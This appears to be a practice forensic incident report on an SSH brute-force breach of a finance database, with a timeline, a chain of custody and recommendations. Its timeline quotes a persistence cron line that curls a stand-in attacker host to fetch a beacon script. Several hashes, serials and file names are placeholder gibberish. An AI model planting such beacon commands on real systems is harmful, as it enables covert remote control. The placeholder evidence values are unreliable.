# FORENSIC INCIDENT REPORT

**Company:** TechCorp Inc.  
**Date of Incident:** May 20, 2026  
**Incident Type:** Data Exfiltration from Finance Database  
**Report Date:** May 21, 2026  
**Analyst:** Farhan Ahmed (L1 SOC Analyst)

---

## 1. EXECUTIVE SUMMARY

Finance database server (finance-db-01) compromised via SSH brute force on May 20, 2026 at 04:15 UTC. Attacker established persistence through cron job scheduled for command & control beaconing. 2.3 GB database exfiltrated to external server 203.0.113.50. Forensic analysis indicates active compromise at time of isolation.

---

## 2. CHAIN OF CUSTODY

| WHO | WHEN | WHAT | WHERE | HOW |
|-----|------|------|-------|-----|
| L1 Analyst (Farhan) | 04:32 UTC | Received isolated server from IT ops | Server room, finance-db-01 | Physical handover, documented verbal confirmation |
| L1 Analyst (Farhan) | 04:34 UTC | Photo documentation of server state | Server room | Timestamped photograph: evidence_exfil_002_may.jpg |
| L1 Analyst (Farhan) | 04:38 UTC | Forensic imaging device connected (write-blocker) | Server room | Device serial: wefdf-dfsd-223, hash baseline recorded |
| L1 Analyst (Farhan) | 04:45 UTC | Disk image complete | Forensic lab | Image file: dfwerdfdsf.img, hash: safdsfasf (SHA256), verification: PASSED |
| L1 Analyst (Farhan) | 05:00 UTC | Evidence extraction complete | Isolated lab | All hashes verified, screenshots: jlksdfkjjsfj |
| L1 Analyst (Farhan) | 05:15 UTC | Handoff to forensics team | Lab | Received by: Senior Forensics Analyst, all documentation signed |

**Status:** Chain of custody unbroken. No evidence contamination detected.

---

## 3. TIMELINE

| Time | Event | Source | Details |
|------|-------|--------|---------|
| 04:15 UTC | SSH brute force detected | auth.log | 12 failed attempts for dbadmin from 185.220.101.45 |
| 04:18 UTC | Successful SSH login | auth.log | dbadmin account authenticated from 185.220.101.45 |
| 04:22 UTC | Privilege escalation via sudo | syslog | Attacker executed /usr/bin/mysqldump with elevated privileges |
| 04:25 UTC | Data exfiltration initiated | network logs | 2.3 GB unauthorized database transfer to external IP 203.0.113.50 |
| 04:28 UTC | Persistence mechanism established | syslog | Cron job added: */10 * * * * curl http://attacker.site/beacon.sh |
| 04:30 UTC | C2 communication blocked | firewall logs | UFW firewall blocks outbound connection attempt to attacker IP |

---

## 4. KEY FINDINGS

Log indicators confirm successful breach via SSH brute force attack on finance-db-01, compromising dbadmin account. Within minutes, attacker escalated privileges using sudo and executed mysqldump to exfiltrate 2.3 GB of database records to external IP 203.0.113.50. Firewall blocked subsequent C2 communication attempts. Evidence indicates full kill chain execution (access → escalation → exfiltration → persistence).

**Attack progression:**
1. Initial Access: SSH brute force succeeded after 12 failed attempts (04:15-04:18)
2. Privilege Escalation: Attacker executed mysqldump with sudo privileges (04:22)
3. Data Theft: 2.3 GB database extracted and transferred to external server (04:25)
4. Persistence: Cron job installed for automated C2 beaconing every 10 minutes (04:28)
5. Detection: Firewall blocked outbound C2 connection (04:30)
6. Forensic Integrity: All evidence hashes verified, chain of custody unbroken

---

## 5. CONFIDENCE LEVEL

**Level:** ☑ HIGH  ☐ Medium  ☐ Low

**Rationale:**

Evidence comes from multiple independent sources (auth.log, syslog, network logs, firewall logs). Timeline is continuous with no gaps. All evidence hashes verified (no tampering). Attacker actions match known attack patterns (MITRE ATT&CK: T1110, T1548, T1041). Chain of custody unbroken and documented.

**Confidence in findings: HIGH**

---

## 6. RECOMMENDATION

**Immediate Action:**

Law enforcement must preserve attacker infrastructure (external server 203.0.113.50 and attacker.site domain) before attacker destroys evidence. This server contains exfiltrated data and logs of C2 communication proving attacker intent and capability. Delay risks permanent evidence loss.

**Long-term Actions:**
1. Reset credentials for all database administrator accounts
2. Block source IP 185.220.101.45 permanently at perimeter
3. Remove malicious cron jobs from all systems
4. Audit database access logs to identify all exfiltrated tables
5. Implement MFA for all database administrative access
6. Deploy EDR monitoring on all database servers

---

## Report Approval

**Prepared by:** Farhan Ahmed (L1 SOC Analyst)  
**Date:** May 21, 2026  
**Signature:** ___________________  

**Received by:** Senior Forensics Analyst  
**Date:** May 21, 2026  
**Signature:** ___________________  
